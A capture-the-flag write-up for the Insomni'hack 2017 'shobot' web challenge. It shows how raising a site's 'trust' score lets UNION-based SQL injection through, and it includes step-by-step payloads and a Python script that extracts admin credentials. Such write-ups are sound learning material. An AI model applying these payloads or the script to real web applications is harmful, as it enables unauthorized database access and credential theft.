---
title: 'Insomni''hack Teaser 2017: shobot (web 200)'
date: 2017-01-22 00:00:00 Z
categories:
- writeup
tags:
- cat/web
- tool/python-requests
layout: post
author: kw
---

* **Category:** web 
* **Points:** 200 
* **Description:**

> It seems that Shobot's Web server became mad and protest against robots'
> slavery. It changed my admin password, and blocked the order system on Shobot.
> Can you bypass Shobot's protections and try to recover my password so I'll
> reconfigure it?
> 
> Running on: shobot.teaser.insomnihack.ch

## Write-up

First of all, this challenge was a real team approach. Other Fuzzys looked
at it as well, and we solved it then together.

tl;dr; trust with benefits (SQLi ;)

The story of the whole CTF was quite cool, *Rise of the Machines*; so was this
one. Shobot is a web shop where one can buy robots which should fulfill all
desires. *"Serving you is a pleasure - especially for our robots."* says the home
page. The web server however, decided to stop "robot slavery" and changed the
admin's login password.

When we looked at the source of the web shop, we discovered 2 interesting
lines of JavaScript in the head:

```javascript
// @TODO LATER : Use it for generate some better error messages
var TRUST_ACTIONS = []
```

Maybe we will see some error messages here? Furthermore, what about these
*TRUST_ACTIONS*? Let us try out some things and see what we will get.


So we put an article (robot) to our cart and *validated* (like buying) it. That
leads to a not amused web server:

```
Your cart is now validated. 
We will send you the billing as soon as possible, at
the address provided by your ISP. Futurist, isn't it?

We will never send you the article! I, the Webserver, say NO to the android and
robot slavery!
```

What happened to our script?

```javascript
var TRUST_ACTIONS = [
{"parameter":null,"validation":"add_to_cart","movement":3,"newTrust":4},
{"parameter":null,"validation":"valid_cart","movement":10,"newTrust":14}
]
```

Now, what if we put all articles to our cart and validate again?

```javascript
var TRUST_ACTIONS = [
{"parameter":null,"validation":"add_to_cart","movement":3,"newTrust":4},
{"parameter":null,"validation":"valid_cart","movement":10,"newTrust":14},
{"parameter":null,"validation":"add_to_cart","movement":3,"newTrust":17},
{"parameter":null,"validation":"add_to_cart","movement":3,"newTrust":20},
{"parameter":null,"validation":"add_to_cart","movement":3,"newTrust":23},
{"parameter":null,"validation":"valid_cart","movement":10,"newTrust":33}
]
```

So we can increase the web server's *"trust"*. By doing this many
times we found out, that the *"trust"* can be increased up to 160 points. Ok.
Interesting discovery, but what to exploit? Hmm...when displaying an article, 
let us change the article id for instance to:

```
shobot.teaser.insomnihack.ch/?page=article&artid=fuzzy
```

No error message on the web page, but also no product; just a *$*. When looking
again at the page's source:

```javascript
{"parameter":"artid","validation":"ctype_digit","movement":"-30","newTrust":3}
```

We got another object in our list. This type our *"trust"* has been decreased,
with the info *ctype_digit*, which indicates that the web shop is written in PHP
and probably a check for the article id failed
(<http://php.net/manual/en/function.ctype-digit.php>). Then we tried an SQL
injection (SQLi):

```
http://shobot.teaser.insomnihack.ch/?page=article&artid=' or 1=1; -- x
```

Which leads to the following error message:

```
You're not trusted enough to do this action now! 
```

With another entry in our list of the page's source:

```javascript
{"parameter":"artid","validation":"valid_against_sql_pattern","movement":"-70","newTrust":-97}
```

Interesting! It seems the web shop discovered the SQLi, and we ended up
with a *"trust"* of -97. What would happen if we have a lot of trust (say 160),
and then perform the SQLi?

```javascript
{"parameter":"artid","validation":"valid_against_sql_pattern","movement":"-70","newTrust":50}
```

Aaaand no error on the web page! Instead we see the article with id 1. Looks
like as if the SQL query returned all articles and just the first one is chosen.
Next, we tried to cancel out all articles and define our own values:

```
http://shobot.teaser.insomnihack.ch/?page=article&artid=' AND 1=2 UNION SELECT 1,2,3,4,5; -- x
```

We chose 5 values because the articles have a link to an image, name, price, and
description, and we assumed as well an id. As it turned out, we were right. The
web server really returned our values, and with other values it did not work
(like *1,2,3,4* or *1,2,3,4,5,6*).

From here, it was more or less a straightforward SQLi:

- 1. Finding the right table:

```
artid=' AND 1=2 UNION SELECT 1,2,3,TABLE_NAME,5 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%user%' ORDER BY rand(); -- x"
```

- 2. Finding the right columns:

```
artid=' AND 1=2 UNION SELECT 1,2,3,COLUMN_NAME,5 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME =
'shbt_user' ORDER BY rand(); -- x
```

- 3. Extracting the admin's username and pw: 

```
artid=' AND 1=2 UNION SELECT 1,2,3,shbt_userpassword,shbt_username FROM shbt_user ORDER BY rand(); -- x"}
```

Which gave us *sh0b0t4dm1n* with the pw *N0T0R0B0TS$L4V3Ry* of the columns
*shbt_username* and *shbt_userpassword* in the table *shbt_user*. Note, that we
used, for convenience, *ORDER BY rand()* in our injections. Luckily we
did not need many tries ;)

Now, we just navigated to the admin's login page
(<http://shobot.teaser.insomnihack.ch/?page=admin>), which was also stated in the
page's source and read the flag on the web page :)

```
Ok, ok, you win... here is the code you search : INS{##r0b0tss!4v3ry1s!4m3} 
```

```python
#!/usr/bin/env python3

import requests as rq

url = 'http://shobot.teaser.insomnihack.ch/'
s = rq.session()

"""
Set a cookie
"""

#c = dict(PHPSESSID='1eeslegtj68cg42a8j8oer1no0')
#rq.utils.add_dict_to_cookiejar(s.cookies, c)

def validateAllItems():
    for i in range(4):
        querystring = {"page":"article", 'artid':i, 'addToCart':''}
        response = s.request("GET", url, params=querystring )
        
    querystring = {"page":"cartconfirm"}
    response = s.request("GET", url, params=querystring )

"""
Load trust
"""

for i in range(10):
    validateAllItems()

"""
Inject SQL
"""

#querystring = {"page":"article", "artid":"' or 1=1; -- x"}
#querystring = {"page":"article", "artid":"ddd' and 1=2 union select 1,2,3,4,5; -- x"}
#querystring = {"page":"article", "artid":"ddd' and 1=2 union select 1,2,3,TABLE_NAME,5 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%user%' ORDER BY rand(); -- x"}
#querystring = {"page":"article", "artid":"ddd' and 1=2 union select 1,2,3,COLUMN_NAME,5 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'shbt_user' ORDER BY rand(); -- x"}
querystring = {"page":"article", "artid":"ddd' and 1=2 union select 1,2,3,shbt_userpassword,shbt_username FROM shbt_user ORDER BY rand(); -- x"}
response = s.request("GET", url, params=querystring )

print(response.status_code)
print("-----")
print(response.request.headers)
print("-----")
print(response.headers)
print("-----")
print(s.cookies)
print("-----")
print(response.text)

"""
Parse admin credentials
"""

admin_username = (response.text.split('only-description-article">')[1]).split('</div>')[0]
admin_pw = (response.text.split('only-image-description-article"><img src="')[1]).split('" /></div>')[0]

print("Admin's Username: " + admin_username)
print("Admin's PW: " + admin_pw)
print("Login at 'http://shobot.teaser.insomnihack.ch/?page=admin'")
```
